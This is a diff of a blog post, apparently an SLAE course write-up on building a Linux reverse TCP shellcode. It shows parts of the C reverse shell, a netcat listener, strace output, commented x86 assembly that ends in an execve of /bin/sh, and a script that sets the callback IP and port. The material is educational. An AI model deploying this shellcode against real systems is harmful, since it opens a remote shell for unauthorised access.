@@ -4,66 +4,10 @@ title:  "[SLAE 2] Reverse TCP Shellcode"
 
 ![Logo](/assets/images/tux-root.png)
 
-## This is the second assignment of the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) exam: building a reverse TCP shellcode. As for the previous bind tcp one, I've started with a C program that creates a reverse TCP connection:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
+## Reverse TCP Shellcode
+
+This is the second assignment of the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) exam: building a reverse TCP shellcode. As for the previous _`bind tcp`_ one, I've started with a C program that creates a reverse TCP connection:
+```c
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -122,41 +66,34 @@ int main() {
  
     return 0;
 }
+```
 
 I've then compiled the reverse shell:
-?
-1
+```bash
 $ gcc -Wall shell_reverse_tcp.c -o shell_reverse_tcp
-Started the listener: 
-?
-1
-2
+```
+
+And started the listener to test: 
+```bash
 $ nc -lvvp 8888
 Listening on [0.0.0.0] (family 0, port 8888)
+```
+
 And in another terminal executed the reverse shellcode: 
-?
-1
+```bash
 $ ./shell_reverse_tcp
-?
-1
-2
-3
-4
+```
+
+Sure-enough,the listener received a remote connection:
+```bash
 Listening on [0.0.0.0] (family 0, port 8888)
 Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 60226)
 whoami
 liv
+```
 
-To see the system calls necessary to implement this in assembly, I've used strace:
-?
-1
-2
-3
-4
-5
-6
-7
-8
+To see the system calls necessary to implement this in assembly, I've used _`strace`_:
+```bash
 $ strace ./shell_reverse_tcp
 ...
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
@@ -165,8 +102,10 @@ dup2(3, 0)                              = 0
 dup2(3, 1)                              = 1
 dup2(3, 2)                              = 2
 execve("/bin/sh", ["/bin/sh"], [/* 0 vars */]) = 0
+```
 
-Next is the commented assembly source implementing the system calls from above:
+Next is the commented assembly source code implementing the system calls from above:
+```assembly
 global _start   
 
 section .text
@@ -251,25 +190,10 @@ _start:
 
  mov al, 11      ; execve syscall
  int 0x80
+```
 
-
-The IP and port are replaced by a bash script, which does compilation and linking:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
+The IP address and port are replaced by a bash script, which does the compilation and linking:
+```bash
 $ ./compile.sh 
 Usage: compile.sh {ip} {port}
 $ ./compile.sh 127.0.0.2 8899
@@ -285,7 +209,7 @@ $ ./shell_reverse_tcp
 Connection from [127.0.0.1] port 8899 [tcp/*] accepted (family 2, sport 41801)
 whoami
 liv
-
+```
 
 ##
 
